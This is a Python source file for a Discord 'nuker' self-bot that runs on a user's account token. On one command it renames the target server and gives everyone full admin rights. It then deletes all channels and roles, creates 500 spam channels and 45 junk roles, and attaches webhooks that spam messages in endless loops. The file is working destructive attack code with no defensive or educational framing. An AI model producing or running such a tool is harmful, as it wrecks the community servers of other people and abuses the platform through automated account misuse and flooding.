import discord
import os
import threading
import string
import random
import json
import aiohttp
from discord.ext import commands, tasks
from discord import Webhook, AsyncWebhookAdapter
import datetime
import requests
from colored import fg, attr
import sys
import website
import base64
import ctypes
from discord_webhook import DiscordWebhook, DiscordEmbed


intents=discord.Intents.all()
intents.members = True

token = "TOKEN HERE"
prefix = ","

client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True,intents=intents)

servername = 'servername'
webhookname = ["webhook name"]
webhookspam = ["spam message"]
webhookavatar = 'webhook avatar'
rolename = 'role names'
channelname = ["channel names"]

@client.command(aliases=['n'])
async def w(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)

async def nuke(guild):
      print("Nuking")
      role = discord.utils.get(guild.roles, name = "@everyone")
      try:
        await guild.edit(name=servername)
        await guild.edit(icon=None)
        await role.edit(permissions = discord.Permissions.all())
        print(f"Successfully granted admin permissions in {guild.name}")
      except:
        print(f"Admin permissions NOT GRANTED in {guild.name}")
      for channel in guild.channels:
        try:
          await channel.delete()
          print(f"Successfully deleted channel {channel.name}")
        except:
          print(f"Channel {channel.name} has NOT been deleted.")
      for i in range(500):
        await guild.create_text_channel(random.choice(channelname))
      for role in list(guild.roles):
        try:
          await role.delete()
          print (f"{role.name} has been deleted in {guild.name}")
        except:
          print (f"{role.name} has NOT been deleted in {guild.name}")
      for i in range(45):
        await guild.create_role(name=rolename)
      print(f"Nuked {guild.name}.")

@client.event
async def on_guild_channel_create(channel):
      webhook = await channel.create_webhook(name = webhookname)
      webhook_url = webhook.url
      async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
        while True:
          await webhook.send(random.choice(webhookspam), username = random.choice(webhookname), avatar_url=(webhookavatar))
client.run(token, bot=False)
